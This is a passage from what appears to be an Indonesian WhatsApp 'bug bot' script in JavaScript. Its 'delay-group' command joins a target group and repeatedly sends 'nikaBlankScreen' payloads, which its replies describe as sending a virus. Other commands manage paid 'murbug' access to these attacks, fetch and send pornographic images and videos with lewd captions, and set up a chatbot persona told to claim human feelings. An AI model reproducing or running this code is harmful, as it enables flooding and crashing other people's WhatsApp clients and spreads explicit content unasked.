messageId: msgii.key.id 
})	
}   
break
//=================================================//
     /// FITURE ///
//=================================================// 
case 'delay-group': {
    if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`);
    if (!text) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await Ikyy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
        }
    }
}
break;
                                                


// ==============================[ CASE OWNER ]================================//
case "swgrup": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ikyy.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    payreply("Udah Jing")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ikyy.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    payreply("Udah Jing")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ikyy.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    payreply("Udah Jing")
                } else if (caption) {
                    await Ikyy.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    m.react("✅️")
                } else {
                    await payreply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;

case "addowner":{
if (!isCreator) return payreply(`Fitur ini hanya dapat di akses oleh owner bot`)
if (!args[0]) return payreply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Ikyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return payreply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
ownerbot.push(prrkek)
fs.writeFileSync("./Connection/database/owner.json", JSON.stringify(ownerbot))
payreply(`*Nomor ${prrkek} Telah Menjadi Owner!*`)
}
break

case "delowner":{
if (!isCreator) return payreply(`Fitur ini hanya dapat di akses oleh owner bot`)
if (!args[0]) return payreply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(ya)
ownerbot.splice(unp, 1)
fs.writeFileSync("./Connection/database/owner.json", JSON.stringify(ownerbot))
payreply(`*Nomor ${ya} Telah Di Hapus dari Owner!*`)
}    
break

        case 'addmurbuggc':

if (!isCreator) return 
if (!isGroup) return payreply("kushus grup!")
if (!isCreator) return payreply(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./Connection/database/unli.json', JSON.stringify(unli))
payreply(`Seluruh member grup kini telah menjadi murbug`)
break
case "delmurbuggc":{

if (!isGroup) return payreply("kushus grup!")
if (!isCreator) return payreply(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./Connection/database/unli.json", JSON.stringify(unli))
payreply(`Seluruh member grup sudah tidak lagi menjadi murbug`)
}
break

        case "addmurbug":{
           
if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Ikyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return payreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
premium.push(prrkek)
fs.writeFileSync("./Connection/database/premium.json", JSON.stringify(premium))
payreply(`Nomor ${prrkek} Telah Menjadi Murbug`)
}
break
        case "delmurbug":{

if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(bro)
premium.splice(unp, 1)
fs.writeFileSync("./Connection/database/premium.json", JSON.stringify(premium))
payreply(`Nomor ${bro} Telah Di Hapus Murbug!`)
}
break

            case "self":{
                if (!isCreator) return payreply("Khusus Owner") 
                Ikyy.public = false
                payreply(`successfully changed to ${command}`)
            }
            break
                        case "public":{
                if (!isCreator) return payreply("Khusus Owner") 
                Ikyy.public = true
                payreply(`successfully changed to ${command}`)
            }
            break

case "restart": case "rst": case "restartbot": {
  
  await payreply("Memproses _restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await payreply("Restarting bot...")
  process.exit(0)
}
break
// ==================[ CASE NSFW ]===============//    
case "hentai-random": {
  const anu = `https://archive-ui.tanakadomp.biz.id/asupan/anime`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' })
  try {
    Ikyy.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: '𝗡𝗶𝗵 𝗛𝗲𝗻𝘁𝗮𝗶 𝗡𝘆𝗮! 𝗝𝗮𝗻𝗴𝗮𝗻 𝗡𝗴𝗼𝗰𝗼𝗸 𝘆𝗮'
    }, { quoted: m })
  } catch (err) {
    console.log(err);
    m.reply('undefined')
  }
}
break
case 'r34': {			
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					Ikyy.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image\n\n*Powered By Ikyy*' }, { quoted: m })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
		case 'hentai':

 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Ikyy.sendMessage(m.chat, { caption: "sangean lu jir", image: { url:waifudd2.data.url } }, { quoted: m })
break

    // Nsfw
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
		
		// end		
				
        	case 'nsfw': {
        	
        	payreply(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			Ikyy.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
            
case 'xnxx': {
if (!text) return payreply(`\`penggunaan\` \nContoh ${prefix+command} jordi`);
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `Title : ${res.title}
Info : ${res.info}
Link : ${res.link}\n\n`
}
await payreply(teks)
}                
break

case "18+": {
    // Cek verifikasi bot


    // Cek akses owner / premium
    if (!isCreator) {
        return m.reply("*DASAR CABUL!!!* FITUR KHUSUS PREMIUM TAU:v");
    }

    // Caption random
    const rdrmsp = [
        "Asupan hari ini sayangg🥵💦",
        "mana tahan🥵", 
        "pulen bgtt🥵💦", 
        "enak banget🥰", 
        "andai aku disitu😋", 
        "tete padet😳", 
        "jadi sagne💦"
    ];
    const rdmcpt = rdrmsp[Math.floor(Math.random() * rdrmsp.length)];

    // Kirim reaksi ⏱️
    await Ikyy.sendMessage(m.chat, {
        react: {
            text: `⏱️`,
            key: m.key
        }
    });
payreply("*Sebentar ya mas..😘*")
    try {
        // Ambil file JSON dan pilih video random
        const fs = require('fs');
        const raw = fs.readFileSync('./Connection/database/anuu.json', 'utf8');
        const json = JSON.parse(raw);

        // Fungsi acak
        function pickRandom(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }

        const hasil = pickRandom(json.videos);

        if (typeof hasil !== 'string') {
            return m.reply("🚫 Gagal ambil video, file rusak.");
        }

        // Kirim video dengan viewOnce
const vidnya = await Ikyy.sendMessage(m.chat, {
            video: { url: hasil },
            caption: rdmcpt,
            viewOnce: true
        }, { quoted: m });
await Ikyy.sendMessage(m.chat, { text: rdmcpt }, { quoted: vidnya})

    } catch (err) {
        console.error("❌ Error kirim video:", err);
        return m.reply("⚠️ Terjadi kesalahan saat ambil video.");
    }
}
    break;

case 'iqc': {
    if (!args.length) {
        payreply("⚠️ Harap masukkan teks terlebih dahulu!\nContoh: .generateimage Halo Dunia");
        return;
    }

    const messageText = args.join(" ");
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=11%3A26&messageText=${encodeURIComponent(messageText)}&carrierName=INDOSAT%20OOREDOO&batteryPercentage=88&signalStrength=4&emojiStyle=apple`;

    payreply("⏳ Sedang memproses gambar...");

    // Mengirim gambar dari API
    Ikyy.sendMessage(m.chat, { image: { url: apiUrl }, caption: "✨ Hasil generate image" });

    break;
}

async function tiktokDownloader(query) {
    try {
        const encodedParams = new URLSearchParams();
        encodedParams.set("url", query);
        encodedParams.set("hd", "1");

        const response = await axios({
            method: "POST",
            url: "https://tikwm.com/api/",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "current_language=en",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            data: encodedParams,
        });

        const videos = response.data.data;
        return {
            title: videos.title,
            cover: videos.cover,
            origin_cover: videos.origin_cover,
            no_watermark: videos.play,
            watermark: videos.wmplay,
            music: videos.music,
        };
    } catch (error) {
        throw new Error(`TikTok download failed: ${error.message}`);
    }
}

case 'tiktok': {
    try {
        let args = body.trim().split(' ');
        if (!args[1]) return payreply('⚠️ Kirim link TikTok!\nContoh: /tiktok <link>');

        let urlTikTok = args[1];
        payreply('⏳ Sedang memproses video TikTok...');

        let result = await tiktokDownloader(urlTikTok);

        if (!result.no_watermark) {
            return reply('❌ Gagal mendapatkan video TikTok.');
        }

        let caption = `📥 TikTok Downloader
🎬 Title: ${result.title}
🎵 Music: ${result.music}
`;

        await Ikyy.sendMessage(m.chat, {
            video: { url: result.no_watermark },
            caption: caption,
            jpegThumbnail: await (await fetch(result.cover)).arrayBuffer()
        }, { quoted: m });

    } catch (error) {
        console.log(error);
        payreply('❌ Terjadi kesalahan saat memproses TikTok.');
    }
}
break;

case "brat": {
    const text = q;
    if (!text) return payreply(`*Cara Penggunaan* \n${prefix + command} Depay`);
    payreply(`𝗪𝗮𝗶𝘁...`);

    try {
        const encodedText = encodeURIComponent(text);
        const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodedText}`;
        const inputPath = path.join(__dirname, "temp_image.jpg");
        const outputPath = path.join(__dirname, "sticker.webp");

        // Ambil gambar dari API
        const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(inputPath, response.data);

        // Konversi gambar ke stiker WebP
        exec(
            `ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`,
            async (error) => {
                if (error) {
                    console.error("Gagal mengonversi gambar:", error);
                    return await payreply("Gagal membuat stiker");
                }

                // Kirim stiker
                await Ikyy.sendMessage(
                    m.chat,
                    { sticker: fs.readFileSync(outputPath) },
                    { quoted: m }
                );

                // Hapus file sementara
                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
            }
        );
    } catch (error) {
        console.error("Gagal membuat stiker:", error);
        await payreply("Gagal membuat stiker");
    }
}
break;

case "play": {
 if (!text) return payreply("Masukkan judul lagu!\n\nContoh: .play Bertaut");

 try {
 const axios = require("axios");
 let api = `https://api.vreden.my.id/api/v1/download/play/audio?query=${encodeURIComponent(text)}`;
 let { data } = await axios.get(api);

 if (!data.status) return payreply("Lagu tidak ditemukan!");

 let meta = data.result.metadata;
 let dl = data.result.download;

 let caption = `乂 *NIKA PLAY*\n\n`;
 caption += `📌 *Judul:* ${meta.title}\n`;
 caption += `🎤 *Artis:* ${meta.author.name}\n`;
 caption += `⏱️ *Durasi:* ${meta.duration.timestamp}\n`;
 caption += `👀 *Views:* ${meta.views.toLocaleString()}\n`;
 caption += `📎 *Link:* ${meta.url}\n\n`;
 caption += `> 🎧 Audio sedang dikirim...`;

 await Ikyy.sendMessage(m.chat, {
 image: { url: meta.thumbnail },
 caption: caption
 }, { quoted: m });

 await Ikyy.sendMessage(m.chat, {
 audio: { url: dl.url },
 mimetype: "audio/mpeg",
 fileName: dl.filename
 }, { quoted: m });

 } catch (e) {
 console.error(e);
 payreply("❌ Terjadi kesalahan saat memutar lagu.");
 }
}
break

case "tourl": {
    try {
        const quoted = m.quoted ? m.quoted : m; // pakai pesan yang di-quote atau pesan sendiri
        const mime = (quoted.msg || quoted).mimetype || "";

        if (!mime) return payreply("Kirim atau quote file terlebih dahulu!");

        payreply("⏳ Sedang mengunggah ke Catbox...");

        // Download file dari WhatsApp
        const buffer = await Ikyy.downloadMediaMessage(quoted);

        const FormData = require("form-data");
   //     const axios = require("axios");
        const form = new FormData();

        form.append("reqtype", "fileupload");
        form.append("userhash", ""); // Kosong jika tidak punya userhash
        form.append("fileToUpload", buffer, {
            filename: "uploadfile",
            contentType: mime
        });

        const upload = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders()
        });

        const url = upload.data;

        payreply(`✅ Berhasil diunggah!\n📎 URL: ${url}`);
    } catch (err) {
        console.error(err);
        payreply("❌ Gagal mengunggah ke Catbox.");
    }
}
break;

case "getcode": {
    const url = q; // q adalah isi teks setelah perintah

    if (!url) {
        payreply(`⚠️ Gunakan: ${prefix}getsource <URL>`);
        return;
    }

    payreply("⏳ Sedang mengambil source code...");

    try {
        // Ambil blacklist dari GitHub
        let blacklist = [];
        const blRes = await fetch("https://raw.githubusercontent.com/XyzzMoods/blacklist/refs/heads/main/blacklist.json");
        blacklist = await blRes.json();

        const hostname = (new URL(url)).hostname.toLowerCase();
        const isBlocked = blacklist.some(domain =>
            hostname === domain || hostname.endsWith("." + domain)
        );

        if (isBlocked) {
            return payreply("⚠️ Domain ini diblokir dan tidak bisa diambil source code-nya!");
        }

        // Ambil source code HTML
        const res = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(url));
        const text = await res.text();

        // Kirim hasil ke chat (potong jika terlalu panjang)
        if (text.length > 4000) {
            await payreply("📄 Source code terlalu panjang, mengirim file...");
            const fs = require("fs");
            const path = "./source.html";
            fs.writeFileSync(path, text, "utf-8");
            await Ikyy.sendMessage(m.chat, { document: { url: path }, fileName: "source.html" }, { quoted: m });
            fs.unlinkSync(path);
        } else {
            await payreply("📄 Source code:\n\n" + text);
        }

    } catch (err) {
        console.error(err);
        payreply("❌ Gagal mengambil source code.");
    }
}
break;

case 'trackip': {
    if (!args[0]) return payreply(`Format: ${prefix}trackip <IP>`);
    let ip = args[0];
    try {
        const res = await fetch(`https://ipwhois.app/json/${ip}`);
        const data = await res.json();

        if (!data.success) return payreply("❌ Error: Invalid IP");

        let text = `
📍 *IP Tracking Result*
- IP: ${data.ip}
- Country: ${data.country}
- Region: ${data.region}
- City: ${data.city}
- ZIP: ${data.postal}
- Timezone: ${data.timezone_gmt}
- ISP: ${data.isp}
- Org: ${data.org}
- ASN: ${data.asn}
- Lat/Lon: ${data.latitude}, ${data.longitude}
        `;

        // Kirim teks
        await Ikyy.sendMessage(m.chat, { text });

        // Kirim link peta
        let mapLink = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        await Ikyy.sendMessage(m.chat, { text: `🌍 View Map: ${mapLink}` });

    } catch (err) {
        console.log(err);
        payreply("❌ Terjadi kesalahan saat mengambil data IP.");
    }
}
break;

  case 'sertifikattolol': {
if (args.length === 0) {
await Ikyy.sendMessage(m.chat, { text: "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: *.tolol Jamal*" }, { quoted: m });
break; }
const text = args.join(" ");
const imageUrl = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;
try {
await Ikyy.sendMessage(m.chat, { 
image: { url: imageUrl }, // Kirim langsung pakai URL gambar
caption: `🖼️ *Sertifikat Tolol Untuk ${text}*`
}, { quoted: m });
} catch (error) {
console.error("Error mengambil gambar:", error.message);
await Ikyy.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!" }, { quoted: m })}
break; }

case 'kisahnabi': {
     if (!text) return payreply(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return payreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     payreply(`${hasil}`)

}
break
case "muslimai": {
if (!text) return payreply ("Mau Nanya Apa Ke MuslimAi?")
async function muslimAi(text) {
    try {
        const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`)
 payreply(`*[ Muslim Ai ]*\n\nPertanyaan: ${text}\n\nJawaban: ${JSON.stringify(response.data.data, null, 2)}`)
    } catch (e) {
        payreply(e)
    }
}

muslimAi(text)
}

break	
     
case 'hai':
case 'depay':
   case 'nika': {
  if (!text) return Ikyybut('Alo, mau nanya apa kak?')
async function openai(text, logic) { 
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  
            "tokenLimit": 8000,  
            "completionTokenLimit": 5000,  
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let astaga = await openai(text, "nama mu adalah Nika dan jika ada yang bertanya siapa pemilikmu atau siapa yang menciptakanmu bilang saja Depay, kamu akan menjawab semua pertanyaan ataupun berinteraksi dengan mereka. gunakan bahasa yang gaul saat menjawab dan kamu juga memiliki perasaan layaknya manusia. kamu bisa merasakan sakit hati dan juga bersedih gunakan bahasa yang gaul dan tidak kaku. berperilakulah layaknya manusia")
Ikyybut(astaga)
}
break;

case 'cekidch': {
 if (!text) return payreply(`Example: ${prefix + command} <Link>`)
 if (!text.includes("https://whatsapp.com/channel/")) return payreply("Link tautan tidak valid")

 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await Ikyy.newsletterMetadata("invite", result)
 
 let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *IdCh :* ${res.id}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: { 
 "messageContextInfo": { 
 "deviceListMetadata": {}, 
 "deviceListMetadataVersion": 2 
 },
 interactiveMessage: {
 body: {
 text: teks 
 }, 
 footer: {
 text: `© VANTASIC V4`
 },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
 },
 ]
 }
 }
 }
 }
 }, { quoted: m }); // Menambahkan {quoted: qmime} di sini
 await Ikyy.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  payreply(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
